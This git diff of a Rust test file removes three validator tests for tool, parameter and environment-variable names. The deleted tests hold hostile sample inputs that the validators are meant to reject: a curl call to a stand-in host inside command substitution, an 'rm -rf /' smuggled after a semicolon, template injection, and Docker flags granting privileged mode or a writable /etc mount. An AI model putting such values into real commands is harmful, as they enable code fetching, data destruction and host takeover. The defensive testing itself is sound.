@@ -4589,18 +4589,6 @@ ado-aw-debug:
     }
 
     #[test]
-    fn test_is_safe_tool_name() {
-        assert!(validate::is_safe_tool_name("create-pull-request"));
-        assert!(validate::is_safe_tool_name("noop"));
-        assert!(validate::is_safe_tool_name("my-tool-123"));
-        assert!(!validate::is_safe_tool_name(""));
-        assert!(!validate::is_safe_tool_name("$(curl evil.com)"));
-        assert!(!validate::is_safe_tool_name("foo; rm -rf /"));
-        assert!(!validate::is_safe_tool_name("tool name"));
-        assert!(!validate::is_safe_tool_name("tool\ttab"));
-    }
-
-    #[test]
     fn test_generate_enabled_tools_args_skips_unknown_tool() {
         // An unrecognized (but safe-formatted) tool name should be skipped.
         // When no valid MCP tools remain, return empty (all tools available).
@@ -4992,21 +4980,6 @@ safe-outputs:
             "expected debug-only redirection error, got: {}",
             msg
         );
-    }
-
-    // ─── parameter name validation ──────────────────────────────────────────
-
-    #[test]
-    fn test_is_valid_parameter_name() {
-        assert!(validate::is_valid_parameter_name("clearMemory"));
-        assert!(validate::is_valid_parameter_name("myParam"));
-        assert!(validate::is_valid_parameter_name("_private"));
-        assert!(validate::is_valid_parameter_name("param123"));
-        assert!(!validate::is_valid_parameter_name(""));
-        assert!(!validate::is_valid_parameter_name("has space"));
-        assert!(!validate::is_valid_parameter_name("has-dash"));
-        assert!(!validate::is_valid_parameter_name("${{inject}}"));
-        assert!(!validate::is_valid_parameter_name("123startsWithDigit"));
     }
 
     #[test]
@@ -6292,20 +6265,6 @@ safe-outputs:
             env.is_empty(),
             "Should be empty when no extensions need pipeline vars"
         );
-    }
-
-    #[test]
-    fn test_is_valid_env_var_name() {
-        assert!(validate::is_valid_env_var_name("MY_VAR"));
-        assert!(validate::is_valid_env_var_name("_PRIVATE"));
-        assert!(validate::is_valid_env_var_name("A"));
-        assert!(validate::is_valid_env_var_name("VAR123"));
-        assert!(!validate::is_valid_env_var_name(""));
-        assert!(!validate::is_valid_env_var_name("123ABC"));
-        assert!(!validate::is_valid_env_var_name("MY-VAR"));
-        assert!(!validate::is_valid_env_var_name("MY VAR"));
-        assert!(!validate::is_valid_env_var_name("X --privileged"));
-        assert!(!validate::is_valid_env_var_name("X -v /etc:/etc:rw"));
     }
 
     #[test]
